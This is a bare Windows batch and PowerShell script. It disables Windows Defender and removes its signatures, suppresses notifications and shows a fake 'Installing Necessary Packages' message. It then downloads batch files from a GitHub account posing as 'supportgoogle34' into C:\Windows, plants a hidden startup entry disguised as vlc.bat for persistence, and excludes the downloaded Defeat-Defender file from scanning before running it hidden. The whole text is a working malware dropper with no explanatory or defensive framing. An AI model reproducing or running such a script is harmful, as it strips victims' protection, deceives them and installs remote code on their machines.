
sc stop WinDefend
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true
powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -command Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
powershell -command Set-MpPreference -DisableIOAVProtection $true
MpCmdRun -RemoveDefinitions -All
MpCmdRun -RemoveDefinitions -DynamicSignatures

New-Item -Path "HKCU:\Software\Policies\Microsoft\Windows" -Name "Explorer" -force
New-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Explorer" -Name "DisableNotificationCenter" -PropertyType "DWord" -Value 1
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications" -Name "ToastEnabled" -PropertyType "DWord" -Value 0


echo  Installing Necessary Packages.....Please Wait.....

color 0a

cd  %temp%



curl https://raw.githubusercontent.com/supportgoogle34/files/main/kernal.bat > C:\Windows\kernal.bat
 

cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

echo "powershell.exe -command Start-Process -FilePath "C:\Windows\kernal.bat" -ArgumentList "args" -WindowStyle Hidden  " >> vlc.bat




curl https://raw.githubusercontent.com/supportgoogle34/files/main/Defeat-Defender.bat > C:\Windows\defet.bat
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Windows\defet.bat"
Add-MpPreference -ExclusionProcess "C:\Windows\defet.bat"

set pop=%systemroot%
powershell.exe -command Start-Process -FilePath "C:\Windows\defet.bat" -ArgumentList "args" -WindowStyle Hidden
defet.bat

